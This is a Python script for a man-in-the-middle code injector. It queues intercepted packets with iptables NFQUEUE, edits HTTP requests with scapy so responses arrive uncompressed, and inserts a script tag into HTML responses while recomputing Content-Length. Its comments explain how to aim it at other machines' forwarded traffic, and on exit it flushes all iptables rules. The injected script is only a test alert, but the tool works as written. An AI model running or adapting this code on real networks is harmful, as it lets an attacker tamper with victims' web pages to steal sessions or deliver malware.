#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0      run this to store packets in a queue for remote machine

# iptables -I OUTPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine
# iptables -I INPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine

# pip install netfilterqueue
# after flush the iptables :- iptables --flush
import netfilterqueue
import subprocess
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return str(packet)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 8080:
            print("[+] http request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            load = load.replace("HTTP/2", "HTTP/1.0")
            load = load.replace("HTTP/3", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 8080:
            print("[+] http response")
            # modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test')</script></body>")
            injection_code = "<script>alert('test');</script>"
            # load = load.replace("<body>", "<body>" + injection_code)
            load = load.replace("</body>", injection_code + "</body>")

            print(scapy_packet.show())
            content_length_e = re.search(r"(?:Content-Length:\s*)(\d*)", load)
            if content_length_e and "text/html" in load:
                content_length = content_length_e.group(1)
                new_conten_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_conten_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(new_packet)
            # print(scapy_packet.show())

    packet.accept()



try:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] deleting ip tables")
    subprocess.call("iptables --flush", shell=True)
